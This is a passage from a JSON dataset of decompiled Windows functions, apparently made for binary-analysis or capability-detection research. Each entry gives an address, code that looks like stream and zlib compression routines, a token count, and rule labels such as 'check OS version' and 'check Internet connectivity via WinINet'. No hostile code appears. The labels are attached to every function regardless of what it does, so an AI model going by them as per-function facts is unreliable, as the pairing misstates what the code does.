        "decompiled_code": "\nvoid __cdecl fcn.00426da0(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *in_EDX;\n    uint unaff_EBX;\n    uint *puVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    int32_t *in_FS_OFFSET;\n    uint var_5ch;\n    int32_t *var_58h;\n    uint32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    char *var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    char *var_3ch;\n    int32_t var_38h;\n    char *var_31h;\n    uint32_t var_1ch;\n    uint32_t var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x441470;\n    var_ch = *in_FS_OFFSET;\n    var_14h = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_50h = arg_ch;\n    var_38h = arg_10h;\n    var_3ch = in_EDX;\n    fcn.004185d0(var_14h);\n    var_4h = 0;\n    var_58h = fcn.00427500();\n    var_4h = 0xffffffff;\n    if (var_54h != 0) {\n        fcn.0042d14d(0);\n        iVar2 = *(var_54h + 4);\n        if ((iVar2 != 0) && (iVar2 != -1)) {\n            *(var_54h + 4) = iVar2 + -1;\n        }\n        iVar2 = *(var_54h + 4);\n        fcn.0042d175();\n        puVar4 = ~-(iVar2 != 0) & var_54h;\n        if (puVar4 != NULL) {\n            (***puVar4)(1);\n        }\n    }\n    fcn.00427380();\n    var_4h = 1;\n    cVar1 = *var_3ch;\n    if ((cVar1 == '+') || (cVar1 == '-')) {\n        var_40h = 1;\n    }\n    else if ((cVar1 == '0') && ((var_3ch[1] == 'x' || (var_3ch[1] == 'X')))) {\n        var_40h = 2;\n    }\n    else {\n        var_40h = 0;\n    }\n    pcVar6 = stack0xffffffcc;\n    if (var_1ch < 0x10) {\n        pcVar6 = &var_31h + 1;\n    }\n    iVar2 = var_38h;\n    if (*pcVar6 != '\\x7f') {\n        pcVar6 = stack0xffffffcc;\n        if (var_1ch < 0x10) {\n            pcVar6 = &var_31h + 1;\n        }\n        if ('\\0' < *pcVar6) {\n            if (var_1ch < 0x10) {\n                var_48h = &var_31h + 1;\n            }\n            else {\n                var_48h = stack0xffffffcc;\n            }\n            cVar1 = *var_48h;\n            iVar5 = arg_10h;\n            while (((cVar1 != '\\x7f' && (iVar2 = arg_10h,  '\\0' < cVar1)) && (iVar2 = arg_10h,  cVar1 < iVar5 - var_40h)\n                   )) {\n                iVar5 = iVar5 - cVar1;\n                iVar2 = (arg_10h - iVar5) + 1;\n                pcVar6 = var_3ch + iVar5;\n                fcn.0042f33d(var_3ch + iVar5 + 1, iVar2, pcVar6, iVar2);\n                *pcVar6 = '\\0';\n                arg_10h = arg_10h + 1;\n                if ('\\0' < var_48h[1]) {\n                    var_48h = var_48h + 1;\n                }\n                iVar2 = arg_10h;\n                cVar1 = *var_48h;\n            }\n        }\n    }\n    var_38h = iVar2;\n    uVar3 = *(var_50h + 0x14) & 0x1c0;\n    if (uVar3 != 0x40) {\n        if (uVar3 == 0x100) {\n            puVar4 = fcn.00427240(&var_4ch, arg_14h, arg_18h);\n            var_3ch = var_3ch + var_40h;\n            var_38h = arg_10h - var_40h;\n            puVar4 = fcn.00427040(*puVar4, puVar4[1]);\n            arg_14h = *puVar4;\n            arg_18h = puVar4[1];\n            arg_10h = var_38h;\n        }\n        else {\n            puVar4 = fcn.00427040(arg_14h, arg_18h);\n            arg_14h = *puVar4;\n            arg_18h = puVar4[1];\n            arg_10h = var_38h;\n        }\n    }\n    (**(*var_58h + 8))();\n    puVar4 = fcn.004272b0(&var_5ch, arg_10h, arg_14h, arg_18h);\n    arg_8h_00 = *puVar4;\n    arg_ch_00 = puVar4[1];\n    *(var_50h + 0x20) = 0;\n    *(var_50h + 0x24) = 0;\n    fcn.00427040(arg_8h_00, arg_ch_00);\n    if (0xf < var_1ch) {\n        fcn.0042d62b(stack0xffffffcc);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(unaff_EBX);\n    return;\n}\n",
        "token_count": 1448
    },
    "00427040": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427040(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uint8_t unaff_BL;\n    uint *unaff_EDI;\n    \n    if (in_EAX != 0) {\n        do {\n            if (arg_ch == NULL) {\ncode_r0x0042708a:\n                arg_8h = CONCAT31(arg_8h._1_3_, 1);\n            }\n            else {\n                if ((*arg_ch[9] == 0) || (piVar1 = arg_ch[0xd],  *piVar1 < 1)) {\n                    uVar3 = (**(*arg_ch + 0xc))(unaff_BL);\n                }\n                else {\n                    *piVar1 = *piVar1 + -1;\n                    puVar2 = *arg_ch[9];\n                    *arg_ch[9] = puVar2 + 1;\n                    *puVar2 = unaff_BL;\n                    uVar3 = unaff_BL;\n                }\n                if (uVar3 == 0xffffffff) goto code_r0x0042708a;\n            }\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *unaff_EDI = arg_8h;\n    unaff_EDI[1] = arg_ch;\n    return;\n}\n",
        "token_count": 326
    },
    "00427240": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427240(uint *arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    uint8_t *puVar3;\n    int32_t in_EAX;\n    uint32_t uVar4;\n    uint8_t *in_ECX;\n    \n    if (in_EAX != 0) {\n        do {\n            if (arg_10h == NULL) {\ncode_r0x0042728d:\n                arg_ch = CONCAT31(arg_ch._1_3_, 1);\n            }\n            else {\n                uVar1 = *in_ECX;\n                if ((*arg_10h[9] == 0) || (piVar2 = arg_10h[0xd],  *piVar2 < 1)) {\n                    uVar4 = (**(*arg_10h + 0xc))(uVar1);\n                }\n                else {\n                    *piVar2 = *piVar2 + -1;\n                    puVar3 = *arg_10h[9];\n                    *arg_10h[9] = puVar3 + 1;\n                    *puVar3 = uVar1;\n                    uVar4 = uVar1;\n                }\n                if (uVar4 == 0xffffffff) goto code_r0x0042728d;\n            }\n            in_ECX = in_ECX + 1;\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 364
    },
    "004272b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.004272b0(uint *arg_8h, int32_t arg_ch, uint arg_10h, int32_t *arg_14h)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint uVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint8_t unaff_BL;\n    uint var_10h;\n    uint var_8h;\n    \n    do {\n        iVar4 = fcn.0042e260(in_EAX, 0, arg_ch);\n        iVar5 = arg_ch;\n        if (iVar4 != 0) {\n            iVar5 = iVar4 - in_EAX;\n        }\n        puVar6 = fcn.00427240(&var_10h, arg_10h, arg_14h);\n        arg_10h = *puVar6;\n        arg_14h = puVar6[1];\n        if (arg_ch - iVar5 == 0) {\n            uVar3 = *puVar6;\n            arg_8h[1] = puVar6[1];\n            *arg_8h = uVar3;\n            return arg_8h;\n        }\n        if (unaff_BL != 0) {\n            arg_14h = puVar6[1];\n            var_8h = *puVar6;\n            if (arg_14h == NULL) {\ncode_r0x00427346:\n                var_8h = CONCAT31(var_8h._1_3_, 1);\n            }\n            else {\n                if ((*arg_14h[9] == 0) || (piVar1 = arg_14h[0xd],  *piVar1 < 1)) {\n                    uVar7 = (**(*arg_14h + 0xc))(unaff_BL);\n                }\n                else {\n                    *piVar1 = *piVar1 + -1;\n                    puVar2 = *arg_14h[9];\n                    *arg_14h[9] = puVar2 + 1;\n                    *puVar2 = unaff_BL;\n                    uVar7 = unaff_BL;\n                }\n                if (uVar7 == 0xffffffff) goto code_r0x00427346;\n            }\n            arg_10h = var_8h;\n        }\n        in_EAX = in_EAX + iVar5 + 1;\n        arg_ch = (arg_ch - iVar5) + -1;\n    } while( true );\n}\n",
        "token_count": 575
    },
    "004273c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.004273c0(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h;\n    int32_t *unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x441318;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar5 = 0;\n    fcn.0042d14d(0);\n    iVar3 = *0x457824;\n    var_4h = 0;\n    var_10h = *0x457824;\n    if (*0x468034 == 0) {\n        uVar4 = 0;\n        fcn.0042d14d(0);\n        if (*0x468034 == 0) {\n            *0x455b04 = *0x455b04 + 1;\n            *0x468034 = *0x455b04;\n        }\n        fcn.0042d175(uVar4, uVar5, uVar1);\n    }\n    uVar1 = *0x468034;\n    iVar2 = *unaff_EDI;\n    if (*0x468034 < *(iVar2 + 0xc)) {\n        arg_8h = *(*(iVar2 + 8) + *0x468034 * 4);\n        if (arg_8h == 0) goto code_r0x0042744c;\ncode_r0x0042746a:\n        if (arg_8h != 0) goto code_r0x004274d3;\n    }\n    else {\n        arg_8h = 0;\ncode_r0x0042744c:\n        if (*(iVar2 + 0x14) == '\\0') goto code_r0x0042746a;\n        iVar2 = fcn.0042ce23();\n        if (uVar1 < *(iVar2 + 0xc)) {\n            arg_8h = *(*(iVar2 + 8) + uVar1 * 4);\n            goto code_r0x0042746a;\n        }\n    }\n    arg_8h = iVar3;\n    if (iVar3 == 0) {\n        iVar3 = fcn.00427640(&var_10h, unaff_EDI);\n        if (iVar3 == -1) {\n            fcn.0042d848(\"bad cast\");\n            fcn.0042f5f6(&var_24h, 0x4511b4);\n        }\n        arg_8h = var_10h;\n        *0x457824 = var_10h;\n        fcn.0042d14d(0);\n        if (*(arg_8h + 4) != -1) {\n            *(arg_8h + 4) = *(arg_8h + 4) + 1;\n        }\n        fcn.0042d175();\n        fcn.0042cdac(arg_8h);\n    }\ncode_r0x004274d3:\n    var_4h = 0xffffffff;\n    fcn.0042d175();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 795
    },
    "00427500": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00427500(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h;\n    int32_t *unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x441318;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar5 = 0;\n    fcn.0042d14d(0);\n    iVar3 = *0x457828;\n    var_4h = 0;\n    var_10h = *0x457828;\n    if (*0x468038 == 0) {\n        uVar4 = 0;\n        fcn.0042d14d(0);\n        if (*0x468038 == 0) {\n            *0x455b04 = *0x455b04 + 1;\n            *0x468038 = *0x455b04;\n        }\n        fcn.0042d175(uVar4, uVar5, uVar1);\n    }\n    uVar1 = *0x468038;\n    iVar2 = *unaff_EDI;\n    if (*0x468038 < *(iVar2 + 0xc)) {\n        arg_8h = *(*(iVar2 + 8) + *0x468038 * 4);\n        if (arg_8h == 0) goto code_r0x0042758c;\ncode_r0x004275aa:\n        if (arg_8h != 0) goto code_r0x00427613;\n    }\n    else {\n        arg_8h = 0;\ncode_r0x0042758c:\n        if (*(iVar2 + 0x14) == '\\0') goto code_r0x004275aa;\n        iVar2 = fcn.0042ce23();\n        if (uVar1 < *(iVar2 + 0xc)) {\n            arg_8h = *(*(iVar2 + 8) + uVar1 * 4);\n            goto code_r0x004275aa;\n        }\n    }\n    arg_8h = iVar3;\n    if (iVar3 == 0) {\n        iVar3 = fcn.00427700(&var_10h, unaff_EDI);\n        if (iVar3 == -1) {\n            fcn.0042d848(\"bad cast\");\n            fcn.0042f5f6(&var_24h, 0x4511b4);\n        }\n        arg_8h = var_10h;\n        *0x457828 = var_10h;\n        fcn.0042d14d(0);\n        if (*(arg_8h + 4) != -1) {\n            *(arg_8h + 4) = *(arg_8h + 4) + 1;\n        }\n        fcn.0042d175();\n        fcn.0042cdac(arg_8h);\n    }\ncode_r0x00427613:\n    var_4h = 0xffffffff;\n    fcn.0042d175();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 789
    },
    "00428e40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00428e40(int32_t *param_1)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t in_EAX;\n    int32_t iVar8;\n    int32_t iVar9;\n    int16_t *piVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint16_t *puVar15;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar9 = param_1[2];\n    iVar3 = param_1[3];\n    iVar4 = param_1[6];\n    iVar13 = param_1[5];\n    iVar5 = *param_1;\n    iVar6 = param_1[1];\n    *(in_EAX + 0xfe4) = 0;\n    *(in_EAX + 0xfe8) = 0;\n    *(in_EAX + 0xfec) = 0;\n    *(in_EAX + 0xff0) = 0;\n    *(in_EAX + 0xff4) = 0;\n    *(in_EAX + 0xff8) = 0;\n    *(in_EAX + 0xffc) = 0;\n    *(in_EAX + 0x1000) = 0;\n    *(iVar5 + 2 + *(in_EAX + 0x1004 + *(in_EAX + 0x18fc) * 4) * 4) = 0;\n    iVar11 = 0;\n    var_10h = *(in_EAX + 0x18fc) + 1;\n    var_8h = 0;\n    if (var_10h < 0x23d) {\n        var_ch = in_EAX + 0x1004 + var_10h * 4;\n        var_18h = 0x23d - var_10h;\n        var_10h = var_10h + var_18h;\n        do {\n            iVar7 = *var_ch;\n            iVar8 = *(iVar5 + 2 + *(iVar5 + 2 + iVar7 * 4) * 4) + 1;\n            if (iVar13 < iVar8) {\n                iVar11 = iVar11 + 1;\n                iVar8 = iVar13;\n                var_8h = iVar11;\n            }\n            *(iVar5 + 2 + iVar7 * 4) = iVar8;\n            if (iVar7 <= iVar4) {\n                piVar10 = in_EAX + 0xfe4 + iVar8 * 2;\n                *piVar10 = *piVar10 + 1;\n                iVar14 = 0;\n                if (iVar3 <= iVar7) {\n                    iVar14 = *(iVar9 + (iVar7 - iVar3) * 4);\n                }\n                uVar12 = *(iVar5 + iVar7 * 4);\n                *(in_EAX + 0x1af3c) = *(in_EAX + 0x1af3c) + (iVar8 + iVar14) * uVar12;\n                iVar11 = var_8h;\n                if (iVar6 != 0) {\n                    *(in_EAX + 0x1af40) = *(in_EAX + 0x1af40) + (*(iVar6 + 2 + iVar7 * 4) + iVar14) * uVar12;\n                }\n            }\n            var_ch = var_ch + 1;\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n        if (iVar11 != 0) {\n            puVar15 = in_EAX + 0xfe4 + iVar13 * 2;\n            do {\n                iVar9 = iVar13 + -1;\n                piVar10 = in_EAX + 0xfe4 + iVar9 * 2;\n                iVar1 = *(in_EAX + 0xfe4 + iVar9 * 2);\n                while (iVar1 == 0) {\n                    piVar10 = piVar10 + -1;\n                    iVar9 = iVar9 + -1;\n                    iVar1 = *piVar10;\n                }\n                piVar10 = in_EAX + 0xfe6 + iVar9 * 2;\n                *piVar10 = *piVar10 + 2;\n                piVar10 = in_EAX + 0xfe4 + iVar9 * 2;\n                *piVar10 = *piVar10 + -1;\n                *puVar15 = *puVar15 - 1;\n                iVar11 = iVar11 + -2;\n            } while (0 < iVar11);\n            for (; iVar13 != 0; iVar13 = iVar13 + -1) {\n                var_ch = *puVar15;\n                if (var_ch != NULL) {\n                    iVar9 = in_EAX + 0x1004 + var_10h * 4;\n                    do {\n                        iVar3 = *(iVar9 + -4);\n                        var_10h = var_10h + -1;\n                        iVar9 = iVar9 + -4;\n                        if (iVar3 <= iVar4) {\n                            uVar2 = *(iVar5 + 2 + iVar3 * 4);\n                            if (uVar2 != iVar13) {\n                                *(in_EAX + 0x1af3c) = *(in_EAX + 0x1af3c) + (iVar13 - uVar2) * *(iVar5 + iVar3 * 4);\n                                *(iVar5 + 2 + iVar3 * 4) = iVar13;\n                            }\n                            var_ch = var_ch - 1;\n                        }\n                    } while (var_ch != NULL);\n                }\n                puVar15 = puVar15 + -1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1367
    },
    "004290e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004290e0(int32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    int32_t iVar6;\n    int32_t unaff_ESI;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = arg_8h[4];\n    iVar6 = arg_8h[1];\n    iVar2 = *arg_8h;\n    iVar4 = 0;\n    var_4h = -1;\n    *(unaff_ESI + 0x18f8) = 0;\n    *(unaff_ESI + 0x18fc) = 0x23d;\n    if (0 < var_8h) {\n        do {\n            if (*(iVar2 + iVar4 * 4) == 0) {\n                *(iVar2 + 2 + iVar4 * 4) = 0;\n            }\n            else {\n                *(unaff_ESI + 0x18f8) = *(unaff_ESI + 0x18f8) + 1;\n                *(unaff_ESI + 0x1004 + *(unaff_ESI + 0x18f8) * 4) = iVar4;\n                *(iVar4 + 0x1900 + unaff_ESI) = 0;\n                var_4h = iVar4;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < var_8h);\n    }\n    iVar4 = *(unaff_ESI + 0x18f8);\n    while (iVar4 < 2) {\n        if (var_4h < 2) {\n            iVar4 = var_4h + 1;\n            var_4h = iVar4;\n        }\n        else {\n            iVar4 = 0;\n        }\n        *(unaff_ESI + 0x18f8) = *(unaff_ESI + 0x18f8) + 1;\n        *(unaff_ESI + 0x1004 + *(unaff_ESI + 0x18f8) * 4) = iVar4;\n        *(iVar2 + iVar4 * 4) = 1;\n        *(unaff_ESI + 0x1900 + iVar4) = 0;\n        *(unaff_ESI + 0x1af3c) = *(unaff_ESI + 0x1af3c) + -1;\n        if (iVar6 != 0) {\n            *(unaff_ESI + 0x1af40) = *(unaff_ESI + 0x1af40) - *(iVar6 + 2 + iVar4 * 4);\n        }\n        iVar4 = *(unaff_ESI + 0x18f8);\n    }\n    arg_8h[6] = var_4h;\n    for (iVar6 = *(unaff_ESI + 0x18f8) / 2; 0 < iVar6; iVar6 = iVar6 + -1) {\n        fcn.00428d60(iVar6);\n    }\n    do {\n        uVar3 = *(unaff_ESI + 0x1004 + *(unaff_ESI + 0x18f8) * 4);\n        iVar6 = *(unaff_ESI + 0x1008);\n        *(unaff_ESI + 0x18f8) = *(unaff_ESI + 0x18f8) + -1;\n        *(unaff_ESI + 0x1008) = uVar3;\n        fcn.00428d60(1);\n        iVar4 = *(unaff_ESI + 0x1008);\n        *(unaff_ESI + 0x18fc) = *(unaff_ESI + 0x18fc) + -1;\n        *(unaff_ESI + 0x1004 + *(unaff_ESI + 0x18fc) * 4) = iVar6;\n        *(unaff_ESI + 0x18fc) = *(unaff_ESI + 0x18fc) + -1;\n        *(unaff_ESI + 0x1004 + *(unaff_ESI + 0x18fc) * 4) = iVar4;\n        *(iVar2 + var_8h * 4) = *(iVar2 + iVar4 * 4) + *(iVar2 + iVar6 * 4);\n        uVar1 = *(unaff_ESI + 0x1900 + iVar4);\n        uVar5 = *(unaff_ESI + 0x1900 + iVar6);\n        if (uVar5 < uVar1) {\n            uVar5 = uVar1;\n        }\n        *(unaff_ESI + 0x1900 + var_8h) = uVar5 + 1;\n        *(iVar2 + 2 + iVar4 * 4) = var_8h;\n        *(iVar2 + 2 + iVar6 * 4) = var_8h;\n        *(unaff_ESI + 0x1008) = var_8h;\n        var_8h = var_8h + 1;\n        fcn.00428d60(1);\n    } while (1 < *(unaff_ESI + 0x18f8));\n    *(unaff_ESI + 0x18fc) = *(unaff_ESI + 0x18fc) + -1;\n    *(unaff_ESI + 0x1004 + *(unaff_ESI + 0x18fc) * 4) = *(unaff_ESI + 0x1008);\n    fcn.00428e40();\n    fcn.00429050(var_4h);\n    return;\n}\n",
        "token_count": 1284
    },
    "00429660": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00429660(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    int32_t unaff_EDI;\n    uint var_4h;\n    \n    *(*(in_ECX + 0x1af34) + 0x19f2c + in_ECX) = *(in_ECX + 0x1af38);\n    if (**(in_ECX + 0x1af50) == -1) {\n        fcn.00429b00();\n    }\n    fcn.004290e0(in_ECX + 0xf90);\n    fcn.004290e0(in_ECX + 0xfac);\n    fcn.00429500();\n    *(in_ECX + 0x1af4c) = *(in_ECX + 0x1af4c) + in_EAX;\n    uVar1 = *(in_ECX + 0x1af3c) + 10U >> 3;\n    uVar2 = *(in_ECX + 0x1af40) + 10U >> 3;\n    if (uVar2 <= uVar1) {\n        uVar1 = uVar2;\n    }\n    if ((uVar1 < in_EAX + 4U) || (arg_8h == 0)) {\n        if (uVar2 == uVar1) {\n            fcn.00429bb0(3);\n            fcn.004299c0(in_ECX + 0x9fc, in_ECX + 0xe7c);\n            uVar1 = *(in_ECX + 0x1af48) + 3 + *(in_ECX + 0x1af40);\n            *(in_ECX + 0x1af44) = *(in_ECX + 0x1af44) + (uVar1 >> 3);\n        }\n        else {\n            fcn.00429bb0(3);\n            fcn.004295d0(*(in_ECX + 0xfa8) + 1, *(in_ECX + 0xfc4) + 1);\n            fcn.004299c0(in_ECX + 0x14, in_ECX + 0x908);\n            uVar1 = *(in_ECX + 0x1af48) + 3 + *(in_ECX + 0x1af3c);\n            *(in_ECX + 0x1af44) = *(in_ECX + 0x1af44) + (uVar1 >> 3);\n        }\n        *(in_ECX + 0x1af48) = uVar1 & 7;\n    }\n    else {\n        fcn.00429bb0(3);\n        *(in_ECX + 0x1af44) = *(in_ECX + 0x1af44) + (*(in_ECX + 0x1af48) + 10U >> 3) + 4 + in_EAX;\n        *(in_ECX + 0x1af48) = 0;\n        fcn.00429d30(arg_8h);\n    }\n    fcn.00428cd0();\n    if (unaff_EDI != 0) {\n        fcn.00429c50();\n        *(in_ECX + 0x1af48) = *(in_ECX + 0x1af48) + 7;\n    }\n    return (*(in_ECX + 0x1af48) >> 3) + *(in_ECX + 0x1af44);\n}\n",
        "token_count": 802
    },
    "00429c50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00429c50(void)\n\n{\n    uint32_t *puVar1;\n    uint *unaff_ESI;\n    \n    if (unaff_ESI[0x6bd7] < 9) {\n        if (unaff_ESI[0x6bd7] < 1) goto code_r0x00429ce4;\n        if (unaff_ESI[0x6bda] <= unaff_ESI[0x6bd9]) {\n            (*unaff_ESI[4])(*unaff_ESI, unaff_ESI[0x6bd8], unaff_ESI + 0x6bd9);\n        }\n        *(unaff_ESI[0x6bd8] + unaff_ESI[0x6bd9]) = *(unaff_ESI + 0x6bd6);\n    }\n    else {\n        puVar1 = unaff_ESI + 0x6bd9;\n        if (unaff_ESI[0x6bda] - 1 <= *puVar1) {\n            (*unaff_ESI[4])(*unaff_ESI, unaff_ESI[0x6bd8], puVar1);\n        }\n        *(unaff_ESI[0x6bd8] + *puVar1) = *(unaff_ESI + 0x6bd6);\n        *puVar1 = *puVar1 + 1;\n        *(*puVar1 + unaff_ESI[0x6bd8]) = *(unaff_ESI + 0x1af59);\n    }\n    unaff_ESI[0x6bd9] = unaff_ESI[0x6bd9] + 1;\ncode_r0x00429ce4:\n    if (unaff_ESI[0x6bd5] != 0) {\n        (*unaff_ESI[4])(*unaff_ESI, unaff_ESI[0x6bd8], unaff_ESI + 0x6bd9);\n    }\n    unaff_ESI[0x6bd6] = 0;\n    unaff_ESI[0x6bd7] = 0;\n    unaff_ESI[0x6bdb] = unaff_ESI[0x6bdb] + 7 & 0xfffffff8;\n    return;\n}\n",
        "token_count": 505
    },
    "00429d30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429d30(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint *in_EAX;\n    uint8_t uVar3;\n    uint32_t unaff_EBX;\n    \n    fcn.00429c50();\n    puVar1 = in_EAX + 0x6bd9;\n    if (in_EAX[0x6bda] - 1 <= *puVar1) {\n        (*in_EAX[4])(*in_EAX, in_EAX[0x6bd8], puVar1);\n    }\n    *(in_EAX[0x6bd8] + *puVar1) = unaff_EBX;\n    *puVar1 = *puVar1 + 1;\n    uVar3 = unaff_EBX >> 8;\n    *(*puVar1 + in_EAX[0x6bd8]) = uVar3;\n    *puVar1 = *puVar1 + 1;\n    if (in_EAX[0x6bda] - 1 <= *puVar1) {\n        (*in_EAX[4])(*in_EAX, in_EAX[0x6bd8], puVar1);\n    }\n    *(in_EAX[0x6bd8] + *puVar1) = ~unaff_EBX;\n    *puVar1 = *puVar1 + 1;\n    *(*puVar1 + in_EAX[0x6bd8]) = ~uVar3;\n    *puVar1 = *puVar1 + 1;\n    in_EAX[0x6bdb] = in_EAX[0x6bdb] + 0x20;\n    if (in_EAX[0x6bd5] != 0) {\n        (*in_EAX[4])(*in_EAX, in_EAX[0x6bd8], puVar1);\n        *puVar1 = unaff_EBX;\n        (*in_EAX[4])(*in_EAX, arg_8h, puVar1);\n        in_EAX[0x6bdb] = in_EAX[0x6bdb] + unaff_EBX * 8;\n        return;\n    }\n    uVar2 = *puVar1 + unaff_EBX;\n    if (uVar2 < in_EAX[0x6bda] || uVar2 == in_EAX[0x6bda]) {\n        fcn.0042f700(in_EAX[0x6bd8] + *puVar1, arg_8h, unaff_EBX);\n        *puVar1 = *puVar1 + unaff_EBX;\n        in_EAX[0x6bdb] = in_EAX[0x6bdb] + unaff_EBX * 8;\n        return;\n    }\n    in_EAX[0x6bdb] = in_EAX[0x6bdb] + unaff_EBX * 8;\n    return;\n}\n",
        "token_count": 653
    },
    "00429e50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
